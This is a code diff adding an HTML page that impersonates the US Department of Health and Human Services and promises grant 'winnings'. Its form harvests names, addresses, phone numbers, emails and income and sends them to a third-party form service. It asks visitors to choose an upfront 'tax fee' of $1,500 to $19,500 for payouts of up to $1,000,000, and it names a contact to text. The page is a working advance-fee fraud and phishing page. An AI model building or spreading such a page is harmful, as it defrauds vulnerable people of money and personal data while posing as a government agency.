@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DEPARTMENT OF HEALTH AND HUMAN SERVICES FUNDS</title>
+    <link rel="shortcut icon" href="asset/Department-of-Health.jpg" type="image/x-icon">
+    <style>
+        
+  /* second page */
+  *,body{
+    padding: 0px;
+    margin: 0px;
+    font-family: Arial, Helvetica, sans-serif;
+    line-height: 24px;
+}
+  .secContainer{
+    width: 100%;
+    
+  }
+  .secBody{
+    max-width: 700px;
+    margin: 40px auto;
+}
+.secBody img{
+    width: 100%;
+    border-radius: 24px;
+}
+.wrapper{
+    padding: 24px;
+    margin-top: 12px;
+    background: white;
+    border-radius: 24px;
+    color: #3f3f3f;
+}
+.wrapper h1{
+    line-height: 40px;
+}
+.formDiv{
+    margin-top: 40px;
+}
+.formBox{
+    margin-top: 40px;
+}
+.formBox .input{
+    width: 90%;
+    margin-top: 12px;
+    outline: none;
+    border-top: none;
+    border-right: none;
+    border-left: none;
+    border-bottom:1;
+    padding-bottom: 12px;
+}
+.chooseBtn{
+    width: fit-content;
+    margin: 0px 12px;
+}
+#otherDiv{
+    display: none;
+    transition: all 0.3S ease-in-out;
+    opacity: 0;
+}
+
+.submitBtn{
+    width: 100%;
+    padding: 12px;
+    border: none;
+    margin-top: 40px;
+    margin-bottom: 40px;
+    color: white;
+    background-color: #226E93;
+    font-size: 14px;
+    border-radius: 5px;
+    transition: 0.3s;
+}
+.submitBtn:hover{
+    background-color: transparent;
+    color: #226E93;
+    border: 1px solid #226E93;
+}
+.update{
+    margin: 10px;
+}
+
+
+
+/* Default styles for desktop */
+/* Your desktop styles here */
+  
+  /* Tablet (portrait) */
+  @media only screen and (max-width: 768px) {
+    .secBody{
+        max-width: 600px;
+        margin: 40px auto;
+    }
+  }
+  @media only screen and (max-width: 670px) {
+    .secBody{
+        max-width: 500px;
+        margin: 40px auto;
+    }
+  }
+  @media only screen and (max-width: 520px) {
+    .secBody{
+        max-width: 400px;
+        margin: 40px auto;
+    }
+  }
+  @media only screen and (max-width: 420px) {
+    .secBody{
+        max-width: 100%;
+        margin: 40px auto;
+    }
+  }
+  
+  /* Mobile (portrait) */
+  @media only screen and (max-width: 320px) {
+    .secBody{
+        max-width: 100%;
+        margin: 40px auto;
+    }
+  }
+    </style>
+</head>
+<body style="background: #dddddd;">
+    <div class="secContainer">
+        <div class="secBody">
+            <img src="asset/header banner.png" alt="" srcset="">
+            <div class="wrapper">
+                <h1>DEPARTMENT OF HEALTH AND HUMAN SERVICES FUNDS</h1><br>
+                <p>
+                    <strong>ECOMPLETE YOUR APPLICATION FORM</strong> <br>
+IF YOU CAN'T FIND YOUR NAME ON THE WINNERS LIST COMPLETE YOUR APPLICATION HERE FOR FAST PROCESSING OR SEND A TEXT TO <strong>ROGER MONTGOMERY 8146064630</strong> FOR A MANUAL PROCESS TO KNOW IF YOU ARE AMONG OUR WINNERS THAT ARE YET TO CLAIM THEIR WINNINGS
+                </p>
+                <div class="formDiv">
+                    <form action="https://formspree.io/f/mdoqwngy" method="POST">
+                        <div class="formBox">
+                            <label for="fullname">Full Name</label><br>
+                            <input type="text" class="input" placeholder="Your answer" name="fullname" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="age">Age</label><br>
+                            <input type="number" class="input" placeholder="Your answer" name="age" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="address">Address</label><br>
+                            <input type="text" class="input" placeholder="Your answer" name="address" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="City">City</label><br>
+                            <input type="text" class="input" placeholder="Your answer" name="City" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="state">State</label><br>
+                            <input type="text" class="input" placeholder="Your answer" name="state" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="zipcode">Zip code</label><br>
+                            <input type="text" class="input" placeholder="Your answer" name="zipcode" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="occupation">Occupation</label><br>
+                            <input type="text" class="input" placeholder="Your answer" name="occupation" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="phone">Phone Number</label><br>
+                            <input type="tel" class="input" placeholder="Your answer" name="phone" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="email">E-Mail Address</label><br>
+                            <input class="input" type="email" placeholder="Your answer" name="email" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="gender">Gender</label><br><br>
+                            
+                            <input type="radio" class="chooseBtn" id="male" name="gender" value="male"><label for="gender">Male</label><br><br>
+  
+                            <input type="radio" class="chooseBtn" id="female" name="gender" value="female"><label for="gender">Female</label>
+                        </div>
+                        <hr style="margin-top: 18px; height: 1.5px; background: #3f3f3f; width: 90%;">
+                        <div class="formBox">
+                            <label for="program">Have You Ever Applied For This Program Before</label><br><br>
+                            
+                            <input type="radio" class="chooseBtn" id="yes" name="program" value="yes"><label for="yes">Yes</label><br><br>
+                            <input type="radio" class="chooseBtn" id="no" name="program" value="no"><label for="yes">No</label><br><br>
+                            <input type="radio" class="chooseBtn" id="maybe" name="program" value="maybe"><label for="maybe">Maybe</label><br><br>                          
+                        </div>
+                        <hr style="margin-top: 18px; height: 1px; background: #3f3f3f; width: 90%;">
+                        <div class="formBox">
+                            <label for="money">Kindly choose your preferable winnings choice out above prices list so that we can know your fee and the price to deliver to your address <br>
+                            (Note:- The fee stand as Tax fee to avoid any deduction from your winning)</label><br><br>
+                            
+                            <input type="radio" class="chooseBtn" id="id1500" name="money" value="$1,500"><label for="money">You Pay $1,500 and get $100,000,00</label><br><br>
+
+                            <input type="radio" class="chooseBtn" id="id2500" name="money" value="$2,500"><label for="money">You pay $2,500 and get $150,000,00</label><br><br>
+
+                            <input type="radio" class="chooseBtn" id="id3500" name="money" value="$3,500"><label for="money">You pay $3,500 and get $200,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id4500" name="money" value="$4,500"><label for="money">You pay $4,500 and get $250,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id5500" name="money" value="$5,500"><label for="money">You pay $5,500 and get $300,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id6500" name="money" value="$6,500"><label for="money">You pay $6,500 and get $350,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id7500" name="money" value="$7,500"><label for="money">You pay $7,500 and get $400,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id8500" name="money" value="$8,500"><label for="money">You pay $8,500 and get $450,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id9500" name="money" value="$9,500"><label for="money">You pay $9,500 and get $500,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id10500" name="money" value="$10,500"><label for="money">You pay $10,500 and get $550,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id11500" name="money" value="$11,500"><label for="money">You pay $11,500 and get $600,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id12500" name="money" value="$12,500"><label for="money">You pay $12,500 and get $650,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id13500" name="money" value="$13,500"><label for="money">You pay $13,500 and get $700,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id14500" name="money" value="$14,500"><label for="money">You pay $14,500 and get $750,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id15500" name="money" value="$15,500"><label for="money">You pay $15,500 and get $800,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id16500" name="money" value="$16,500"><label for="money">You pay $16,500 and get $850,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id17500" name="money" value="$17,500"><label for="money">You pay $17,500 and get $900,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="id19500" name="money" value="$19,500"><label for="money">You pay $19,500 and get $1,000,000.00</label><br><br>                          
+
+                            <input type="radio" class="chooseBtn" id="other" name="money" value="other"><label for="money">Other:</label><br><br>                          
+                        </div>
+
+                        <div class="formBox" id="otherDiv">
+                            <label for="name">Input Your Amount</label><br>
+                         <input type="text" class="input" placeholder="Your amount" name="amountInput">
+                            <p class="update"></p>
+                        </div>
+                        
+                        <div class="formBox">
+                            <label for="name">Monthly Income</label><br>
+                            <input type="text" class="input" placeholder="Your answer" name="name" required>
+                        </div>
+                        <div class="formBox">
+                            <label for="name">Comments and/or questions</label><br>
+                            <input type="text" class="input" placeholder="Your answer" name="comment">
+                        </div>
+                        
+
+                        <button type="submit" class="submitBtn">SUBMIT</button>
+
+                    </form>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+          var otherRadio = document.getElementById('other');
+          var amountInput = document.querySelector('#otherDiv');
+        
+          // Hide the input initially
+          amountInput.style.display = 'none';
+        
+          // Add event listener to the radio button
+          otherRadio.addEventListener('change', function() {
+            if (this.checked) {
+              amountInput.style.display = 'block';
+              amountInput.style.opacity = '1';
+            } else {
+              amountInput.style.display = 'none';
+              amountInput.style.opacity = '0';
+            }
+          });
+        });
+    </script>
+        
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+              var amountInput = document.querySelector('.input[name="amountInput"]');
+              var updateParagraph = document.querySelector('.update');
+            
+              // Add event listener to the input field
+              amountInput.addEventListener('input', function() {
+                // Get the value from the input field
+                var inputValue = parseFloat(this.value);
+            
+                // Check if the input value is less than 500
+                if (inputValue < 500) {
+                  updateParagraph.textContent = "Input $500 upward";
+                  updateParagraph.style.color = 'red';
+                } else {
+                  // Check if the input value is a valid number
+                  if (!isNaN(inputValue)) {
+                    // Calculate the result by multiplying the input value by 51.5
+                    var result = inputValue * 51.5;
+            
+                    // Update the content of the paragraph with the result
+                    updateParagraph.textContent = "$" + result.toFixed(2); // Show the result with 2 decimal places
+                    updateParagraph.style.color = 'green';
+                  } else {
+                    // If the input value is not a valid number, reset the content of the paragraph
+                    updateParagraph.textContent = "0.00";
+                  }
+                }
+              });
+            });
+            </script>
+                    
+</body>
+</html>
